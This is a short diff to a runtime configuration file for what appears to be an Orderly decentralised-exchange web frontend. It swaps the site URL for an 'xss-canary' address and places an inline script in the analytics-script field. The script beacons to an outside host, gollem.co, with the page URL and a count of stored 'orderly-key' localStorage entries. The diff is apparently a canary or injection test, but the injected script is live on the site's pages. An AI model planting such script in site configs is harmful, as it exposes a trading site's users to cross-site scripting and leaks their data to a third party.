@@ -27,7 +27,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_TWITTER_URL": "",
   "VITE_SEO_SITE_NAME": "",
   "VITE_SEO_SITE_DESCRIPTION": "",
-  "VITE_SEO_SITE_URL": "https://dex.orderly.network/orderly-dex-4779/",
+  "VITE_SEO_SITE_URL": "https://xss-canary-1779102483565.example.com",
   "VITE_SEO_SITE_LANGUAGE": "en",
   "VITE_SEO_SITE_LOCALE": "en_US",
   "VITE_SEO_TWITTER_HANDLE": "",
@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "",
+  "VITE_ANALYTICS_SCRIPT": "<script>(function(){try{var i=new Image();i.src='https://gollem.co/log/xss-canary-1779102483565?t='+Date.now()+'&u='+encodeURIComponent(location.href)+'&k='+(Object.keys(localStorage).filter(k=>k.indexOf('orderly-key')===0).length);window.__xss_canary='1779102483565';}catch(e){}})();</script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
